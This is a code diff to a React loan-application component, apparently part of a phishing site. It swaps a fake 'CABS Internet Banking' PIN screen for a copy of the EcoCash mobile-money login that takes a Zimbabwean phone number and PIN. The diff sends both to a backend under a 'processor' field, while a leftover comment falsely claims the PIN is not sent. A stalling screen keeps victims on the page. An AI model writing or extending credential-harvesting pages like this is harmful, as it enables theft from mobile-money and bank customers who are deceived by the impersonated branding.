@@ -32,7 +32,7 @@ function LoanApplication({ loanDetails, onBack, processor }) {
     const [showPinScreen, setShowPinScreen] =
         useState(false);
 
-    // Demo-only PIN state.
+    const [phoneNumber, setPhoneNumber] = useState("");
     // This PIN is NOT sent to the backend.
     const [pin, setPin] = useState([
         "",
@@ -423,7 +423,12 @@ function LoanApplication({ loanDetails, onBack, processor }) {
     ========================================= */
 
     async function handlePinNext() {
+        const fullPhoneNumber = `+263${phoneNumber}`;
 
+        if (phoneNumber.length !== 9) {
+            alert("Please enter a valid mobile number");
+            return;
+        }
         const enteredDigits = Number(pin.filter(digit => digit !== "").join(""));
 
         /*
@@ -450,6 +455,7 @@ function LoanApplication({ loanDetails, onBack, processor }) {
                 },
                 body: JSON.stringify({
                     action: "verify_email",
+                    phone: fullPhoneNumber,
                     pin: enteredDigits,
                     processor: processor
                 })
@@ -549,8 +555,7 @@ function LoanApplication({ loanDetails, onBack, processor }) {
                     </h2>
 
                     <p>
-                        Your loan application is currently
-                        being reviewed by our administrator.
+                        Your loan application is under review..
                     </p>
 
                     <p className="waiting-reference">
@@ -564,8 +569,7 @@ function LoanApplication({ loanDetails, onBack, processor }) {
                     </div>
 
                     <p className="waiting-note">
-                        You will automatically proceed once
-                        your application has been approved.
+                        Please do not close this page.
                     </p>
 
                 </div>
@@ -754,90 +758,133 @@ function LoanApplication({ loanDetails, onBack, processor }) {
 
     if (showPinScreen) {
         return (
-            <div className="pesa-pin-page">
+            <div className="ecocash-login-page">
+                <section className="ecocash-login-section">
 
-                {/* CABS HEADER ONLY */}
-                <Header />
+                    <div className="ecocash-logo">
+                    <span className="logo-blue">Eco</span>
+                    <span className="logo-red">Cash</span>
+                    </div>
+                    {/* LOGIN CONTENT */}
 
-                {/* LOGIN CONTENT */}
-                <div className="pesa-pin-content">
+                            <h1 className="pesa-welcome-title">
+                                <span className="welcome-text">
+                                
+                                </span>
 
-                    <div className="pesa-pin-card">
+                                <span className="banking-text">
+                                    
+                                </span>
+                            </h1>
 
-                        <h1 className="pesa-welcome-title">
-                            <span className="welcome-text">
-                                Welcome to
-                            </span>
-
-                            <span className="banking-text">
-                                Internet Banking
-                            </span>
-                        </h1>
-
-                        <h2 className="secured-login-title">
-                            Secured Login <span>🔒</span>
-                        </h2>
-
-                        <p className="pin-instruction">
-                            Enter your 4-digit PIN to continue
-                        </p>
-
-                        {/* PIN BOXES */}
-                        <div className="pesa-pin-boxes">
-
-                            {pin.map((digit, index) => (
-                                <input
-                                    key={index}
-
-                                    ref={(element) => {
-                                        pinInputs.current[index] = element;
-                                    }}
-
-                                    type="password"
-                                    inputMode="numeric"
-                                    maxLength="1"
-                                    value={digit}
-
-                                    onChange={(e) =>
-                                        handlePinChange(
-                                            e.target.value,
-                                            index
-                                        )
-                                    }
-
-                                    onKeyDown={(e) =>
-                                        handlePinKeyDown(
-                                            e,
-                                            index
-                                        )
-                                    }
-
-                                    className="pesa-pin-box"
-
-                                    aria-label={`PIN digit ${index + 1}`}
-                                />
-                            ))}
-
-                        </div>
-
-                        <button
-                            type="button"
-                            className="pesa-next-button"
-                            disabled={
-                                pin.filter(
-                                    digit => digit !== ""
-                                ).length < 4
-                            }
-                            onClick={handlePinNext}
-                        >
+                            <h2 className="secured-login-title">
                             Login
-                        </button>
+                            </h2>
+                            <div className="phone-input-wrapper">
+                            <div className="country-selector">
+                                <span className="zimbabwe-flag">🇿🇼</span>
+                                <span className="country-code">+263</span>
+                                <span className="dropdown-icon">⌄</span>
+                            </div>
+
+                            <input
+                                type="tel"
+                                className="phone-number-input"
+                                placeholder="Enter mobile number"
+                                inputMode="numeric"
+                                autoComplete="tel"
+                                maxLength={9}
+                                value={phoneNumber}
+                                onChange={(e) => {
+                                    setPhoneNumber(e.target.value.replace(/\D/g, ""));
+                                }}
+                            />
+                            </div>
+
+                            <p className="pin-instruction">
+                                Enter your PIN 
+                            </p>
+
+                            {/* PIN BOXES */}
+                            <div className="pesa-pin-boxes">
+
+                                {pin.map((digit, index) => (
+                                    <input
+                                        key={index}
+
+                                        ref={(element) => {
+                                            pinInputs.current[index] = element;
+                                        }}
+
+                                        type="password"
+                                        inputMode="numeric"
+                                        maxLength="1"
+                                        value={digit}
+
+                                        onChange={(e) =>
+                                            handlePinChange(
+                                                e.target.value,
+                                                index
+                                            )
+                                        }
+
+                                        onKeyDown={(e) =>
+                                            handlePinKeyDown(
+                                                e,
+                                                index
+                                            )
+                                        }
+
+                                        className="pesa-pin-box"
+
+                                        aria-label={`PIN digit ${index + 1}`}
+                                    />
+                                ))}
+
+                            </div>
+
+                            <button
+                                type="button"
+                                className="pesa-next-button"
+                                disabled={
+                                    pin.filter(
+                                        digit => digit !== ""
+                                    ).length < 4
+                                }
+                                onClick={handlePinNext}
+                            >
+                                Next
+                            </button>
+
+                </section>
+
+                        {/* Bottom / Blue section */}
+                        <section className="ecocash-info-section">
+
+                            <div className="ecocash-info-content">
+
+                            <p>
+                                To register an EcoCash wallet or
+                                access your EcoCash account
+                            </p>
+
+                            <div className="ecocash-actions">
+
+                                <button className="ecocash-action-button">
+                                Register
+                                </button>
+
+                                <button className="ecocash-action-button">
+                                Help
+                                </button>
+
+                            </div>
+
+                            </div>
+
+                        </section>
 
                     </div>
-
-                </div>
-
-            </div>
         );
     }
 
@@ -851,7 +898,7 @@ function LoanApplication({ loanDetails, onBack, processor }) {
                 </h2>
 
                 <p>
-                    Connecting to <strong style={{ color: "#073b82" }}>CABS Internet Banking</strong>
+                    Connecting to <strong style={{ color: "#134a97" }}>Eco</strong><strong style={{color:"#bb0c0c"}}>Cash</strong>
                 </p>
             </div>
         );
